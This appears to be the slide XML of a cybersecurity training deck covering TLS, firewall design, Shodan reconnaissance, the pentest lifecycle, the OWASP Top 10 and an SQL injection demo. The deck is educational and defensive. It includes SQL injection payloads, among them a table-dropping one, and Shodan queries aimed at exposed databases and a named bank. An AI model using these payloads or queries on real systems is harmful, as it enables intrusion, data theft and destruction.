                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│ ──── 4. Key Exchange ────────────────→ │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│ ←─── 4. Key Exchange ─────────────── │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│      Both derive the SAME session key  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│       without sending it over the wire │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                                        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│ ══════ 5. AES-256 ENCRYPTED DATA ════ │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Certificate is what makes the padlock. Certificate Chain = Root CA → You.</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INTERMEDIATE</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5 OPENER: NETWORK SECURITY</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FIREWALL RULES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FIREWALL ARCHITECTURE — DEFENCE IN DEPTH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>INTERNET          │  DMZ (Demilitarised Zone)  │  INTERNAL NETWORK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────     │  ─────────────────────────  │  ──────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>All traffic       │  Web server: 80, 443        │  Database: 3306</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  Mail server: 25, 587        │  Internal apps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>↓        │  DNS server: 53              │  Workstations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>FIREWALL 1    │                     ↓        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow 80,443  │              FIREWALL 2      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow 25,587  │              Allow only      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Block all     │              specific DB      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>else          │              connections      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t># UFW Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ufw allow 22/tcp              # SSH from admin only</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ufw allow 443/tcp             # HTTPS from anywhere</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ufw deny 3306                 # MySQL NEVER public</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ufw deny 23/tcp               # Telnet blocked</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ufw default deny incoming     # Default deny all inbound</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SHODAN — THE SECURITY PROFESSIONAL'S SEARCH ENGINE</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SHODAN — "THE INTERNET'S MOST DANGEROUS SEARCH ENGINE"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>What it finds: internet-facing devices, open ports, banners, service versions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ATTACKER SEARCHES:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>country:NG port:3306          # Nigerian MySQL databases open to internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>country:NG port:3389          # RDP servers in Nigeria</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>country:NG "default password" # Devices still using default credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>org:"GTBank"                  # Services belonging to GTBank's IP range</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHAT'S BEEN FOUND (documented cases):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • MongoDB databases in Nigeria with no authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • IP cameras with default credentials (admin/admin)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Old WordPress sites exposing /wp-admin to internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Database connection strings in indexed error pages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEFENDER USE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Search YOUR organisation's IP range on Shodan.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>If Shodan can see it — so can every attacker in the world.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Anything visible but unintended = immediate security action required.</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INTERMEDIATE</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6 OPENER: ETHICAL HACKING</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THE PENTEST LIFECYCLE (PTES)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PENETRATION TESTING EXECUTION STANDARD (PTES)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. PRE-ENGAGEMENT (LARGEST PHASE — don't skip)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Signed agreement · Scope definition · Rules of Engagement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Emergency contacts · Legal authorisation — ALL BEFORE TOUCHING ANYTHING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2. INTELLIGENCE GATHERING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OSINT · WHOIS · Google Dorking · Shodan · Subdomains · Social media</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3. THREAT MODELLING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>What's most valuable? What's most likely targeted? Priority targets?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4. VULNERABILITY ANALYSIS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Automated scanners + manual testing + CVE research</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5. EXPLOITATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Attempt to exploit findings — within scope, document everything</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>6. POST-EXPLOITATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>What data is accessible? Lateral movement? Privilege escalation?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>7. REPORTING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Executive summary + Technical findings + Remediation roadmap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WITHOUT PHASE 1 PAPERWORK → PHASES 2–7 ARE CRIMINAL.</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ADVANCED</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7 OPENER: WEB APP SECURITY</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OWASP TOP 10 (2021)</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OWASP TOP 10 — MOST CRITICAL WEB VULNERABILITIES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A01 Broken Access Control        User can act beyond intended permissions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A02 Cryptographic Failures       Sensitive data exposed due to weak/missing encryption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A03 Injection                    SQL/Command/LDAP injection — untrusted data as commands</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A04 Insecure Design             Security risks from design flaws, not bugs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A05 Security Misconfiguration   Default credentials, open storage, debug mode on</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A06 Vulnerable Components       Outdated libraries with known CVEs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A07 Auth Failures               Weak passwords, no MFA, bad session management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A08 Software Integrity Failures  Unverified updates, supply chain attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A09 Logging &amp; Monitoring Gaps   Can't detect breaches you don't log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A10 SSRF                        Server tricked into making requests attacker controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Source: OWASP Foundation (owasp.org)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Updated: 2021 | Next update expected: 2025</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SQL INJECTION — LIVE DEMO SLIDE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SQL INJECTION — THE MOST DANGEROUS WEB VULNERABILITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VULNERABLE CODE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AND password='" . $_POST['password'] . "'";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ATTACKER ENTERS: username = admin'--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>RESULTING QUERY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SELECT * FROM users WHERE username='admin'--' AND password='anything'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>↑</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>-- comments out everything after</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Password check is gone. Logged in as admin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WORSE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>username = '; DROP TABLE users;--    ← Deletes the entire users table</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>username = ' UNION SELECT * FROM admin_accounts--  ← Extracts admin data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE FIX (Parameterised Queries):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = ? AND password = ?");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$stmt-&gt;execute([$username, $password]);  // User input is data, never code</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LOG4SHELL: A06 IN PRACTICE</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LOG4SHELL (CVE-2021-44228)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OWASP A06 — The Most Critical Vulnerability of the Decade</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE VULNERABLE CODE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
